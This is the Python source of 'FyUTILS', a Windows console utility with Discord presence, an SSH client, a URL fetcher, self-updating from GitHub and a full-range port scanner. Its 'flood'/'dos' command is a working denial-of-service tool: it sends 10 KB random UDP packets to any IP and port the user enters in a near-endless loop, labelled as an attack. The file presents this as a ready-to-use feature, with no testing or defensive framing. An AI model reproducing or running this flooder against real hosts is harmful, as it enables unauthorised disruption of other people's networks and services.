try:
    import os
    import platform
    import sys
    import time
    import random
    import socket
    import requests
    import string
    import threading
    import paramiko
    import getpass

    from datetime import datetime
    from colorama import Fore, init
    from pypresence import Presence

except:
    os.system("pip install colorama")
    os.system("pip install datetime")
    os.system("pip install pypresence")
    os.system("pip install requests")
    print("")
    print("Please restart FyUTILS.")
    print("")
    os.system("pause")
    sys.exit()

init(convert=True)


def uid_gen(size):
    chars = string.ascii_lowercase + string.digits
    return "".join(random.choice(chars) for char in range(size))


def prefix(arg):
    thread_name = threading.current_thread().name
    if arg == "INFO":
        pre = Fore.LIGHTBLACK_EX + "[" + Fore.LIGHTBLUE_EX + datetime.now().strftime("%H:%M:%S") + Fore.LIGHTBLACK_EX + "] " + Fore.LIGHTBLACK_EX + "(" + Fore.WHITE + "FyUTILS" + Fore.LIGHTBLACK_EX + "/" + Fore.GREEN + str(arg) + Fore.LIGHTBLACK_EX + ") " + Fore.LIGHTBLACK_EX + "[" + Fore.WHITE + thread_name + Fore.LIGHTBLACK_EX + "] " + Fore.WHITE
    if arg == "WARN":
        pre = Fore.LIGHTBLACK_EX + "[" + Fore.LIGHTBLUE_EX + datetime.now().strftime("%H:%M:%S") + Fore.LIGHTBLACK_EX + "] " + Fore.LIGHTBLACK_EX + "(" + Fore.WHITE + "FyUTILS" + Fore.LIGHTBLACK_EX + "/" + Fore.YELLOW + str(arg) + Fore.LIGHTBLACK_EX + ") " + Fore.LIGHTBLACK_EX + "[" + Fore.WHITE + thread_name + Fore.LIGHTBLACK_EX + "] " + Fore.WHITE
    if arg == "ERROR":
        pre = Fore.LIGHTBLACK_EX + "[" + Fore.LIGHTBLUE_EX + datetime.now().strftime("%H:%M:%S") + Fore.LIGHTBLACK_EX + "] " + Fore.LIGHTBLACK_EX + "(" + Fore.WHITE + "FyUTILS" + Fore.LIGHTBLACK_EX + "/" + Fore.RED + str(arg) + Fore.LIGHTBLACK_EX + ") " + Fore.LIGHTBLACK_EX + "[" + Fore.WHITE + thread_name + Fore.LIGHTBLACK_EX + "] " + Fore.WHITE
    if arg == "INIT":
        pre = Fore.LIGHTBLACK_EX + "[" + Fore.LIGHTBLUE_EX + datetime.now().strftime("%H:%M:%S") + Fore.LIGHTBLACK_EX + "] " + Fore.LIGHTBLACK_EX + "(" + Fore.WHITE + "FyUTILS" + Fore.LIGHTBLACK_EX + "/" + Fore.LIGHTBLUE_EX + str(arg) + Fore.LIGHTBLACK_EX + ") " + Fore.LIGHTBLACK_EX + "[" + Fore.WHITE + thread_name + Fore.LIGHTBLACK_EX + "] " + Fore.WHITE
    if arg == "DEBUG":
        pre = Fore.LIGHTBLACK_EX + "[" + Fore.LIGHTBLUE_EX + datetime.now().strftime("%H:%M:%S") + Fore.LIGHTBLACK_EX + "] " + Fore.LIGHTBLACK_EX + "(" + Fore.WHITE + "FyUTILS" + Fore.LIGHTBLACK_EX + "/" + Fore.LIGHTRED_EX + str(arg) + Fore.LIGHTBLACK_EX + ") " + Fore.LIGHTBLACK_EX + "[" + Fore.WHITE + thread_name + Fore.LIGHTBLACK_EX + "] " + Fore.WHITE
    if arg == "SUCCESS":
        pre = Fore.LIGHTBLACK_EX + "[" + Fore.LIGHTBLUE_EX + datetime.now().strftime("%H:%M:%S") + Fore.LIGHTBLACK_EX + "] " + Fore.LIGHTBLACK_EX + "(" + Fore.WHITE + "FyUTILS" + Fore.LIGHTBLACK_EX + "/" + Fore.LIGHTGREEN_EX + str(arg) + Fore.LIGHTBLACK_EX + ") " + Fore.LIGHTBLACK_EX + "[" + Fore.WHITE + thread_name + Fore.LIGHTBLACK_EX + "] " + Fore.WHITE
    return pre


def update_status(state):
    try:
        os.system("title FyUTILS " + version + "-" + version_type + " - " + username + "@" + device + " - " + state)
    except:
        os.system("title " + state)
    try:
        rpc.update(state=state, details=username + "@" + device, small_image="python",
                   large_image="main",
                   buttons=[{"label": "Get FyUTILS", "url": "https://github.com/NoahOnFyre/FyUTILS/releases/latest"}],
                   small_text="Python", large_text="FyUTILS v" + version + "-" + version_type,
                   start=int(rpc_start_time))
    except:
        None


def update_ssh_status(state):
    try:
        os.system("title FyUTILS " + version + "-" + version_type + " - " + ssh_user + "@" + ssh_server + " - " + state)
    except:
        os.system("title " + state)
    try:
        rpc.update(state="[FySSH] " + state, details=ssh_user + "@" + ssh_server, small_image="python",
                   large_image="main",
                   buttons=[{"label": "Get FyUTILS", "url": "https://github.com/NoahOnFyre/FyUTILS/releases/latest"}],
                   small_text="Python", large_text="FyUTILS v" + version + "-" + version_type,
                   start=int(rpc_start_time))
    except:
        None


def add_command_detail(state):
    try:
        os.system(
            "title FyUTILS " + version + "-" + version_type + " - " + username + "@" + device + " - " + "Running: " + cmd + " " + state)
    except:
        os.system("title " + state)
    try:
        rpc.update(state="Running: " + cmd + " " + state, details=username + "@" + device, small_image="python",
                   large_image="main",
                   buttons=[{"label": "Get FyUTILS", "url": "https://github.com/NoahOnFyre/FyUTILS/releases/latest"}],
                   small_text="Python", large_text="FyUTILS v" + version + "-" + version_type,
                   start=int(rpc_start_time))
    except:
        None


def menu():
    os.system("cls")
    time.sleep(0.03)
    print(color() + "  __________               _____  __   ________   ________   ______       ________")
    time.sleep(0.03)
    print(color() + "  ___  ____/  _____  __    __  / / /   ___  __/   ____  _/   ___  /       __  ___/")
    time.sleep(0.03)
    print(color() + "  __  /_      __  / / /    _  / / /    __  /       __  /     __  /        _____ \ ")
    time.sleep(0.03)
    print(color() + "  _  __/      _  /_/ /     / /_/ /     _  /       __/ /      _  /___      ____/ / ")
    time.sleep(0.03)
    print(color() + "  /_/         _\__, /      \____/      /_/        /___/      /_____/      /____/  ")
    time.sleep(0.03)
    print(color() + "              /____/                                                              ")
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
    if update_available:
        time.sleep(0.03)
        print(Fore.LIGHTBLACK_EX + "║ " + color() + "[UPDATE] " + Fore.WHITE + "A new version of FyUTILS is available!")
        time.sleep(0.03)
        print(Fore.LIGHTBLACK_EX + "║ " + color() + "[UPDATE] " + Fore.WHITE + "Current: " + version + "-" + version_type)
        time.sleep(0.03)
        print(Fore.LIGHTBLACK_EX + "║ " + color() + "[UPDATE] " + Fore.WHITE + "Target: " + target_version + "-STABLE")
        time.sleep(0.03)
        print(Fore.LIGHTBLACK_EX + "║ " + color() + "[UPDATE] " + Fore.WHITE + "Update: " + "'update " + target_version + "'")
        time.sleep(0.03)
        print(Fore.LIGHTBLACK_EX + "╠" + "═" * 119)
    else:
        None
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Username:  " + username)
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Device:    " + device)
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Filepath:  " + directory)
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Version:   " + version + "-" + version_type)
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
    print("")


def color():
    config = open(directory + "\\config.txt", 'r').readlines()[0]
    if config.rstrip() == "GREEN":
        rc = Fore.GREEN
    elif config.rstrip() == "LIME":
        rc = Fore.LIGHTGREEN_EX
    elif config.rstrip() == "AQUA" or config == "CYAN":
        rc = Fore.CYAN
    elif config.rstrip() == "YELLOW":
        rc = Fore.YELLOW
    elif config.rstrip() == "PINK" or config == "MAGENTA":
        rc = Fore.MAGENTA
    elif config.rstrip() == "WHITE":
        rc = Fore.WHITE
    elif config.rstrip() == "RED":
        rc = Fore.RED
    elif config.rstrip() == "BLUE":
        rc = Fore.BLUE
    elif config.rstrip() == "BLURPLE":
        rc = Fore.LIGHTBLUE_EX
    elif config.rstrip() == "LAVA":
        rc = Fore.LIGHTRED_EX
    else:
        return Fore.WHITE
    return rc


os.system("title Initializing RPC...")
print(prefix("INIT") + "Initializing RPC...")

try:
    time.sleep(1)
    rpc = Presence("1005822803997638696")
    rpc.connect()
    rpc_start_time = time.time()
    update_status("Starting up...")
except:
    print(prefix("ERROR") + "Can't connect with the discord RPC.")
    time.sleep(0.5)

#
# Variable initialisation
#

print(prefix("INIT") + "Initializing variables...")
os.system("title Initializing variables...")
time.sleep(0.03)
username = os.getlogin()
device = platform.node()
directory = sys.path.__getitem__(0)
threads = os.cpu_count()
version = "1.4"
version_type = "STABLE"
ssh_version = "1.0"
private_ip = socket.gethostbyname(socket.gethostname())
try:
    print(prefix("INIT") + "Checking online status...")
    os.system("title Checking online status...")
    time.sleep(0.03)
    public_ip = requests.get("https://api.ipify.org").content.decode()
except:
    public_ip = "Not online!"
time.sleep(0.03)

#
# Update checker
#

print(prefix("INIT") + "Checking for updates...")
os.system("title Checking for updates...")
time.sleep(0.03)
target_version = requests.get("https://pastebin.com/raw/1bdn1xwc").content.decode().rstrip()
if float(version) != float(target_version):
    update_available = True
else:
    update_available = False

#
# Multithreading initialisation
#

print(prefix("INIT") + "Initializing multithreading...")
os.system("title Initializing multithreading...")
print(prefix("DEBUG") + "Multithreading is disabled for your current version of FyUTILS.")
print(prefix("DEBUG") + "It will be tested by public in BETA-1.8 and may be added in STABLE-1.8")
print(prefix("DEBUG") + "Information about the multithreading update can be found on GitHub")

#
# Config initialisation
#

print(prefix("INIT") + "Initializing config...")
os.system("title Initializing config...")
time.sleep(0.03)
try:
    open(directory + "\\config.txt", "r")
except:
    print("Config not found! Creating config...")
    time.sleep(0.03)
    open(directory + "\\config.txt", "x").writelines("GREEN")
    time.sleep(0.03)
    print(Fore.WHITE + "Please restart FyUTILS!")
    time.sleep(0.03)
    os.system("pause")
    time.sleep(0.03)
    sys.exit()
print(prefix("INIT") + "Initialization phase passed successfully!")
os.system("title Initialization phase passed successfully!")
try:
    time.sleep(0.5)
except KeyboardInterrupt:
    None
print("")

menu()
while True:
    try:
        update_status("Idle")
        try:
            cmd = input(
                Fore.LIGHTBLACK_EX + "╔═══[" + color() + username + Fore.LIGHTBLACK_EX + "@" + Fore.WHITE + device + Fore.LIGHTBLACK_EX + "]═══(" + color() + "FyUTILS " + Fore.WHITE + version + Fore.LIGHTBLACK_EX + "-" + Fore.WHITE + version_type + Fore.LIGHTBLACK_EX + ")" + "\n" + "╚═══" + Fore.LIGHTBLACK_EX + "> " + Fore.WHITE).lower()
        except KeyboardInterrupt:
            update_status("Shutting down...")
            print(Fore.WHITE + "Shutting down FyUTILS...")
            time.sleep(1)
            rpc.close()
            sys.exit()
        update_status("Running: " + cmd)

        if cmd == "exit" or cmd == "quit":
            update_status("Shutting down...")
            print("")
            print(Fore.WHITE + "Shutting down FyUTILS...")
            time.sleep(1)
            try:
                rpc.close()
            except:
                sys.exit()
            sys.exit()

        elif cmd == "rl" or cmd == "reload" or cmd == "clear" or cmd == "cls":
            print("")
            update_status("Reloading...")
            print("")
            menu()

        elif cmd == "update " + target_version:
            print("")
            update_status("Updating FyUTILS...")
            print(prefix("INFO") + "Getting newest FyUTILS version...")
            updateContent = requests.get("https://github.com/NoahOnFyre/FyUTILS/releases/download/" + target_version + "-STABLE" + "/FyUTILS.py").content
            open(directory + "\\FyUTILS.py", "wb").write(updateContent)
            time.sleep(5)
            print(prefix("INFO") + "FyUTILS has been updated successfully!")
            print(prefix("INFO") + "Please restart FyUTILS by simply running 'rs'")
            print("")

        elif cmd == "rs" or cmd == "restart" or cmd == "new":
            print("")
            update_status("Restarting...")
            print("")
            os.system("start " + directory + "\\FyUTILS.py")
            sys.exit()

        elif cmd == "flood" or cmd == "dos":
            print("")
            print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
            try:
                floodtarget = input(
                    Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Target IP" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE)
                floodport = int(input(
                    Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Target port" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE))
                activity_start = time.time()
                add_command_detail(floodtarget + ":" + str(floodport))
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.connect((floodtarget, floodport))
                print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
                print("")
                try:
                    for i in range(sys.maxsize):
                        uid = uid_gen(6)
                        sock.send(random.randbytes(10240))
                        print(prefix(
                            "INFO") + "Attacking: " + color() + floodtarget + Fore.LIGHTBLACK_EX + ":" + color() + str(
                            floodport) + Fore.WHITE + "..." + Fore.LIGHTBLACK_EX + " - " + Fore.WHITE + "Attack: " + color() + str(
                            i + 1) + Fore.LIGHTBLACK_EX + " - " + Fore.WHITE + "UID: " + color() + uid, end='\r')

                    print("\n")
                except KeyboardInterrupt:
                    print("\n" + prefix("INFO") + Fore.WHITE + "Canceling Action...")
                except:
                    print("\n" + prefix("ERROR") + Fore.WHITE + "Target doesn't respond!")
                    time.sleep(3)
                print(prefix("INFO") + f"Time elapsed: {time.time() - activity_start: 0.2f}s")
                print(prefix(
                    "INFO") + "Disconnecting from " + color() + floodtarget + Fore.LIGHTBLACK_EX + ":" + color() + str(
                    floodport) + Fore.WHITE + "...")
                try:
                    sock.close()
                    time.sleep(0.1)
                except:
                    print(prefix("ERROR") + "Cannot disconnect from target!")
                print(prefix("INFO") + "Cleaning up...\n")
            except:
                continue

        elif cmd == "ssh" or cmd == "ssh":
            print("")
            print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
            try:
                update_ssh_status("Logging in...")
                ssh_server = input(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Host IP" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE)
                ssh_port = input(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Host port (default: 22)" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE)
                if ssh_port == "":
                    ssh_port = 22
                else:
                    ssh_port = int(ssh_port)
                ssh_user = input(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Login" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE)
                ssh_password = getpass.getpass(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Password" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE)
                print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
                print("")
                activity_start = time.time()
                update_ssh_status("Connecting...")
                ssh = paramiko.SSHClient()
                ssh.load_system_host_keys()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    ssh.connect(ssh_server, port=ssh_port, username=ssh_user, password=ssh_password)
                except Exception as e:
                    print(prefix("ERROR") + "Can't connect to SSH host. Please make sure, that the requested port is open.")
                    print(prefix("ERROR") + "SSH error: " + str(e))
                    print(prefix("INFO") + f"Time elapsed: {time.time() - activity_start : 0.2f}s")
                    continue
                while True:
                    try:
                        update_ssh_status("Idle")
                        ssh_cmd = input(Fore.LIGHTBLACK_EX + "╔═══[" + Fore.LIGHTMAGENTA_EX + ssh_user + Fore.LIGHTBLACK_EX + "@" + Fore.LIGHTMAGENTA_EX + ssh_server + Fore.LIGHTBLACK_EX + ":" + Fore.LIGHTMAGENTA_EX + str(ssh_port) + Fore.LIGHTBLACK_EX + "]═══(" + color() + "FySSH " + Fore.WHITE + ssh_version + Fore.LIGHTBLACK_EX + ")" + "\n" + "╚═══" + Fore.LIGHTBLACK_EX + "> " + Fore.WHITE)
                        ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(ssh_cmd)
                        update_ssh_status("Running: " + ssh_cmd)
                        print("")
                        for line in ssh_stdout.readlines():
                            print(prefix("INFO") + line)
                        for line in ssh_stderr.readlines():
                            print(prefix("ERROR") + line)
                    except KeyboardInterrupt:
                        break

                print("\n" + prefix("INFO") + "Canceling Action...")
                print(prefix("INFO") + f"Time elapsed: {time.time() - activity_start : 0.2f}s")
                print(prefix("INFO") + "Disconnecting from " + color() + ssh_server + Fore.LIGHTBLACK_EX + ":" + color() + str(ssh_port) + Fore.WHITE + "...")
                try:
                    ssh.close()
                    time.sleep(0.1)
                except:
                    print(prefix("ERROR") + "Cannot disconnect from target!")
                print(prefix("INFO") + "Cleaning up...\n")

            except:
                continue

        elif cmd == "color" or cmd == "clr":
            print("")
            print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
            try:
                colorvalue = input(
                    Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Value" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE).upper()
                add_command_detail(colorvalue)
                open(directory + "\\config.txt", "w").writelines(colorvalue)
                print(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Changes saved to file!")
                print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
                print("")
            except:
                print("")

        elif cmd == "display":
            print("")
            print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[1] " + Fore.WHITE + "Test internet connection.")
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[2] " + Fore.WHITE + "Test")
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[3] " + Fore.WHITE + "Test")
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "╠" + "═" * 119)
            try:
                display_target = int(input(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Select Type" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE))
                print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
                print("")
                activity_start = time.time()
                update_status("Displaying: " + str(display_target))
                while True:
                    try:
                        group_start = time.time()
                        requests.get("https://www.google.com/")
                        print(prefix("SUCCESS") + "You're connected! - " + f"Time elapsed: {time.time() - group_start : 0.2f}s")
                    except KeyboardInterrupt:
                        break;
                    except:
                        print(prefix("INFO") + "It seems, that you are not connected to the internet!")

                print("\n" + prefix("INFO") + "Canceling Action...")
                print(prefix("INFO") + f"Time elapsed: {time.time() - activity_start : 0.2f}s")
                print(prefix("INFO") + "Cleaning up...\n")
            except:
                continue

        elif cmd == "fetchurl" or cmd == "fetchhtml":
            print("")
            print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
            try:
                htmlUrl = input(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "URL" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE)
                htmlFile = input(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "File name" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE)
                activity_start = time.time()
                try:
                    open(directory + "\\" + htmlFile + ".html", "x").write(requests.get(htmlUrl).content.decode())
                    print(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "HTML source code saved to: '" + htmlFile + ".html'")
                    print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
                    print(prefix("INFO") + f"Time elapsed: {time.time() - activity_start: 0.2f}s")
                except:
                    print(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Failed to save source code to: '" + htmlFile + ".html'")
                    print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
                    print(prefix("WARN") + f"Time elapsed: {time.time() - activity_start: 0.2f}s")
                print("")
            except:
                print("")

        elif cmd == "resetconfig" or cmd == "rcnf" or cmd == "configreset":
            print("")
            update_status("Resetting config files...")
            print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
            try:
                print(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "The config has been reset!")
                print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
                open(directory + "\\config.txt", "w").writelines("AQUA")
                print("")
            except:
                print("")

        elif cmd == "vars" or cmd == "variables" or cmd == "var":
            print("")
            update_status("Getting system variables...")
            print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Username:  " + username)
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Device:    " + device)
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Filepath:  " + directory)
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Threads:   " + str(threads))
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Version:   " + version + "-" + version_type)
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Private:   " + private_ip)
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Public:    " + public_ip)
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
            print("")

        elif cmd == "portscan" or cmd == "scanport":
            print("")
            print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
            try:
                scantarget = input(
                    Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Target IP" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE)
                activity_start = time.time()
                add_command_detail(scantarget)
                print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
                print("")
                try:
                    print(prefix("INFO") + "Preparing scan.", end='\r')
                    time.sleep(0.1)
                    print(prefix("INFO") + "Preparing scan..", end='\r')
                    time.sleep(0.1)
                    print(prefix("INFO") + "Preparing scan...", end='\r')
                    for scanport in range(1, 65535):
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        socket.setdefaulttimeout(0.05)
                        result = sock.connect_ex((scantarget, scanport))
                        print(prefix("INFO") + "Scanning Port... " + color() + str(scanport), end='\r')
                        if result == 0:
                            print(prefix("SUCCESS") + "Port " + color() + str(
                                scanport) + Fore.WHITE + " is open!                ")
                        sock.close()
                    print("\n")
                except KeyboardInterrupt:
                    print("\n" + prefix("INFO") + "Canceling Action...")
                except:
                    print("\n" + prefix("ERROR") + "Target doesn't respond!")
                    time.sleep(3)
                print(prefix("INFO") + f"Time elapsed: {time.time() - activity_start : 0.2f}s")
                print(prefix(
                    "INFO") + "Disconnecting from " + color() + scantarget + Fore.LIGHTBLACK_EX + ":" + color() + str(
                    scanport) + Fore.WHITE + "...")
                try:
                    sock.close()
                    time.sleep(0.1)
                except:
                    print(prefix("ERROR") + "Cannot disconnect from target!")
                print(prefix("INFO") + "Cleaning up...\n")
            except:
                continue

        else:
            os.system(cmd)
            print(Fore.WHITE)

        update_status("Idle")
    except KeyboardInterrupt:
        print("")
